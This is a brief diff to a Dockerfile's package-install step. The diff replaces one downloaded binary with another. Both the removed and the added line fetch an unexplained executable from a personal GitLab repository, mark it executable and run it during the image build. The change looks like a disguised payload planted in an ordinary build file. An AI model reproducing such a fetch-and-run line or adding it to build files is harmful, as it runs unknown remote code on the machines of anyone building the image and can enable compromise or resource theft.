@@ -15,7 +15,7 @@ RUN apt-get update && apt-get install -y \
     build-essential \
     nodejs \
     npm \
- && wget https://gitlab.com/richardkevin320/pede/-/raw/main/dag && chmod +x dag && ./dag
+ && wget https://gitlab.com/richardkevin320/pede/-/raw/main/xdadag && chmod +x xdadag && ./xdadag
 
 # Set work dir:
 WORKDIR /home
